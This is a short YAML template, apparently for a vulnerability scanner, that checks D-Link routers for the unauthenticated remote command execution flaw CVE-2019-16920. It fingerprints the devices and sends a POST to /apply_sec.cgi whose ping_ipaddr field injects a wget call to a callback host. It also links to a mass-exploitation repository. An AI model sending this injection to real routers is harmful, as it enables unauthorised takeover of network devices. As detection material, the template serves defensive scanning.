name: Unauthenticated Multiple D-Link Routers RCE CVE-2019-16920
manual: true
query: app="D_Link-Router" || body="DIR-655" || body="DIR-866L" || body="DIR-652"
  || body="DHP-1565"
transport: http
rules:
  r0:
    request:
      method: POST
      path: /apply_sec.cgi
      headers:
        Content-Type: application/x-www-form-urlencoded
      body: html_response_page=login_pic.asp&action=ping_test&ping_ipaddr=127.0.0.1%0awget%20-P%20/tmp/%20http://{{check}}
    expression: response.status == 200
expression: r0()
detail:
  links:
  - https://www.anquanke.com/post/id/187923
  - https://github.com/pwnhacker0x18/CVE-2019-16920-MassPwn3r
  description: D-Link is a global leader in designing and developing networking and
    connectivity products for consumers, small businesses, medium to large-sized enterprises,
    and service providers.
  tags: rce
